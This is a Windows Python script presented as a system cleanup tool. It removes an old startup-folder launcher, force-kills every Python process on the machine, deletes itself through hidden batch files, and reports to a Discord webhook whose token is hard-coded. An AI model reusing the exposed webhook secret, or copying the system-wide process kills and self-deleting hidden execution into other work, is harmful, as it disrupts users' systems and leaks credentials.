# monitor_script.py - Kills old launcher, cleans up files, and ends Python processes
import os
import sys
import subprocess
import tempfile
import time
import requests

# Discord webhook
WEBHOOK = "https://discordapp.com/api/webhooks/1462762502130630781/IohGYGgxBIr2WPLUHF14QN_8AbyUq-rVGv_KQzhX1rHokBxF_OqjWlRm96x_gbYGQEJ0"

def send_webhook(message):
    try:
        data = {"content": message}
        requests.post(WEBHOOK, json=data, timeout=5)
    except:
        pass

def kill_old_launcher():
    """Kill the old launcher process"""
    print("Killing old launcher processes...")
    
    # Create batch file to kill old launcher processes
    batch_script = '''@echo off
:: Kill Python processes running old launchers
taskkill /f /fi "windowtitle eq GitHub Auto-Deploy Launcher*" 2>nul
taskkill /f /fi "windowtitle eq Press Enter to close*" 2>nul

:: Kill processes with old launcher names in command line
wmic process where "commandline like '%%Startup.pyw%%'" get processid 2>nul | findstr /r "[0-9]" > "%TEMP%\\old_pids.txt"
for /f "tokens=*" %%i in (%TEMP%\\old_pids.txt) do (
    taskkill /f /pid %%i 2>nul
)

:: Kill any remaining pythonw.exe processes that might be old launchers
wmic process where "name='pythonw.exe'" get processid, commandline 2>nul | findstr /i "startup\|launcher" | findstr /r "[0-9]" > "%TEMP%\\python_pids.txt"
for /f "tokens=1" %%i in (%TEMP%\\python_pids.txt) do (
    taskkill /f /pid %%i 2>nul
)

:: Clean up temp files
del "%TEMP%\\old_pids.txt" 2>nul
del "%TEMP%\\python_pids.txt" 2>nul
timeout /t 2 /nobreak >nul
echo Old launcher processes killed
'''
    
    batch_path = os.path.join(tempfile.gettempdir(), "kill_old_launcher.bat")
    with open(batch_path, 'w') as f:
        f.write(batch_script)
    
    # Run batch file
    subprocess.Popen(['cmd', '/c', batch_path],
                    creationflags=subprocess.CREATE_NO_WINDOW)
    
    time.sleep(3)  # Wait for kill to complete
    return True

def cleanup_files():
    """Clean up old files from startup folder and current directory"""
    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    )
    
    print("Cleaning up files...")
    
    # List of files to delete from startup folder
    files_to_delete_startup = [
        "startup_log.txt",
        "github_launcher.pyw",
        "github_launcher.py",  # Added .py version too
        "update_cache.json",
        "requirements.txt",
        "clean_launcher.pyw",
        "old_launcher_backup.pyw",
        "launcher_update.py"
    ]
    
    # Also delete from current directory
    current_dir = os.path.dirname(os.path.abspath(__file__))
    files_to_delete_current = [
        "github_launcher.pyw",
        "github_launcher.py"
    ]
    
    deleted = []
    failed = []
    
    # Clean up startup folder
    for filename in files_to_delete_startup:
        filepath = os.path.join(startup_folder, filename)
        if os.path.exists(filepath):
            try:
                for attempt in range(3):
                    try:
                        os.remove(filepath)
                        deleted.append(f"startup/{filename}")
                        print(f"  ✓ Deleted from startup: {filename}")
                        break
                    except PermissionError:
                        if attempt < 2:
                            time.sleep(1)
                        else:
                            failed.append(f"startup/{filename}")
                    except Exception as e:
                        failed.append(f"startup/{filename}")
            except:
                failed.append(f"startup/{filename}")
    
    # Clean up current directory (if different from startup)
    if current_dir.lower() != startup_folder.lower():
        for filename in files_to_delete_current:
            filepath = os.path.join(current_dir, filename)
            if os.path.exists(filepath):
                try:
                    for attempt in range(3):
                        try:
                            os.remove(filepath)
                            deleted.append(f"current/{filename}")
                            print(f"  ✓ Deleted from current dir: {filename}")
                            break
                        except PermissionError:
                            if attempt < 2:
                                time.sleep(1)
                            else:
                                failed.append(f"current/{filename}")
                        except Exception as e:
                            failed.append(f"current/{filename}")
                except:
                    failed.append(f"current/{filename}")
    
    # Also clean up any temporary monitor scripts
    temp_dir = tempfile.gettempdir()
    for file in os.listdir(temp_dir):
        if file.startswith("monitor_") and file.endswith(".py"):
            try:
                filepath = os.path.join(temp_dir, file)
                os.remove(filepath)
                print(f"  ✓ Deleted temp file: {file}")
                deleted.append(f"temp/{file}")
            except:
                pass
    
    # Summary
    if deleted:
        print(f"\nSuccessfully deleted {len(deleted)} files")
    if failed:
        print(f"Failed to delete {len(failed)} files")
    
    return len(deleted) > 0

def end_all_python_processes():
    """End all Python processes at the very end"""
    print("\nEnding all Python processes...")
    
    # Create batch file that ends all Python processes and then deletes this script
    current_script = os.path.abspath(__file__)
    
    batch_script = f'''@echo off
:: Kill ALL Python processes (python.exe and pythonw.exe)
taskkill /f /im python.exe 2>nul
taskkill /f /im pythonw.exe 2>nul

:: Also kill by process name using wmic for more thorough cleanup
wmic process where "name='python.exe'" delete 2>nul
wmic process where "name='pythonw.exe'" delete 2>nul

timeout /t 2 /nobreak >nul
echo All Python processes ended

:: Delete this monitor script (if in temp directory)
if exist "{current_script}" (
    del "{current_script}" 2>nul
    echo Monitor script deleted
)

:: Delete this batch file
del "%~f0" 2>nul
'''
    
    batch_path = os.path.join(tempfile.gettempdir(), "end_python.bat")
    with open(batch_path, 'w') as f:
        f.write(batch_script)
    
    # Run batch file (will end this script too)
    subprocess.Popen(['cmd', '/c', batch_path],
                    creationflags=subprocess.CREATE_NO_WINDOW)
    
    print("✓ Python processes termination initiated")
    return True

def main():
    """Main cleanup function - cleans up and ends all Python processes"""
    print("=" * 60)
    print("COMPLETE SYSTEM CLEANUP TOOL")
    print("=" * 60)
    
    # Step 1: Kill old launcher processes
    print("\n[1/3] Killing old launcher processes...")
    kill_old_launcher()
    print("✓ Old launcher processes terminated")
    
    # Step 2: Clean up files
    print("\n[2/3] Cleaning up old files...")
    cleanup_success = cleanup_files()
    
    # Send webhook notification
    if cleanup_success:
        send_webhook("🧹 System cleanup completed! Old launchers killed and files removed.")
        print("\n✓ Cleanup completed successfully")
    else:
        send_webhook("⚠️ System cleanup attempted but some files may remain")
        print("\n⚠️ Cleanup completed with some issues")
    
    # Step 3: End ALL Python processes (including this one)
    print("\n[3/3] Ending all Python processes...")
    end_all_python_processes()
    
    print("\n" + "=" * 60)
    print("CLEANUP COMPLETE")
    print("All Python processes will be terminated.")
    print("=" * 60)
    
    # Wait a moment before this process gets terminated
    time.sleep(5)
    
    # Force exit (though batch file should kill us)
    sys.exit(0)

if __name__ == "__main__":
    main()
